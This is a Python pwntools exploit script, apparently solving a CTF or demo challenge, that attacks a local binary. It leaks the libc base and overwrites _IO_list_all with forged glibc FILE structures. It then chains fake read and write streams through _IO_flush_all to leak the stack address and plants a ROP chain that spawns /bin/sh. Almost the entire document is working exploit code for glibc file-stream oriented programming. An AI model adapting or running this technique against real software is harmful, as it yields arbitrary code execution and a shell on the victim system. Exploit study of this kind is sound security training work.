#!/usr/bin/env python3

from pwn import *

exe = ELF('./demo_bin_patched', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def fake_io_read(read_addr, leng, next_file):
	global _IO_file_jumps
	payload = fit({
	    0x00: 0x8000 | 0x40 | 0x1000, #_flags
	    0x20: read_addr, #_IO_write_base
	    0x28: read_addr + leng, #_IO_write_ptr
	    0x68: next_file, #_chain
	    0x70: 0, # _fileno
	    0xc0: 0, #_modes
	    0xd8: _IO_file_jumps - 0x8, #_vtables
	}, filler=b'\x00')
	return payload

def fake_io_write(write_addr, leng, next_file):
	global _IO_file_jumps
	payload = fit({
	    0x00: 0x8000 | 0x800 | 0x1000, #_flags
	    0x20: write_addr, #_IO_write_base
	    0x28: write_addr + leng, #_IO_write_ptr
	    0x68: next_file, #_chain
	    0x70: 1, # _fileno
	    0xc0: 0, #_modes
	    0xd8: _IO_file_jumps, #_vtables
	}, filler=b'\x00')
	return payload

script = '''
b *main + 204
b *_IO_flush_all
'''

p = process('./demo_bin_patched')
#p = gdb.debug('./demo_patched', gdbscript = script)

# calculate libc address
rcu(b"leak: ")
stdout = int(p.recvline(), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
lleak("libc base", libc_base)
_IO_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
__environ = libc_base + libc.symbols['__environ']

# create first buffer, will be the fake fp at the _IO_list_all head
sla(b"choice: ", b"1")
rcu(b"address: ")
buf = int(p.recvline(), 16)
payload = fake_io_read(buf + 0x100, 0xe0 * 2, buf + 0x100) # flush this will call read()
sa(b"data: ", payload)

# using arbitrary write, overwrite _IO_list_all with buf (fake fp)
sla(b"choice: ", b"2")
sla(b"addr: ", f"{_IO_list_all}".encode())
sa(b"data: ", p64(buf))

# exit, _IO_flush_all trigger exploit chain
sla(b"choice: ", b"3")

# flushing buf trigger arb write, create 2 another fake fp
## first one to leak environ
payload = fake_io_write(__environ, 0x8, buf + 0x100 + 0xe0) # flush this will call write()
## second one use to restore buf
payload += fake_io_read(buf, 0xe0, buf) # flush this will call read()
s(payload)

# flushing the second trigger arb read, leaking environ value
env_value = u64(p.recv(8))
lleak("environ value", env_value)
rsp_ioflushall = env_value - 0x2c8 # this can change depend on glibc version
lleak("_IO_flush_all's rsp", rsp_ioflushall)

# flushing the third trigger arb read, restore first fake file struct (buf)
payload = fake_io_read(buf + 0x100, 0xe0, buf + 0x100) # flush this will call read()
s(payload)

# flushing the first again, modify the second point to stack (saved rip of any function)
payload = fake_io_read(rsp_ioflushall - 0x8, 0x1000, 0x4141414141414141) # flush this will call read()
s(payload)

# flushing the second again, perform ROP execve("/bin/sh", NULL, NULL)
pop_rdi = libc_base + 0x000000000010f75b
pop_rsi = libc_base + 0x0000000000110a4d
pop_rdx_4dump = libc_base + 0x00000000000b503c
pop_rax = libc_base + 0x00000000000dd237
syscall = libc_base + 0x00000000000288b5
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
rop = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx_4dump) + p64(0) * 5 + p64(pop_rax) + p64(59) + p64(syscall)
s(rop)

p.interactive()
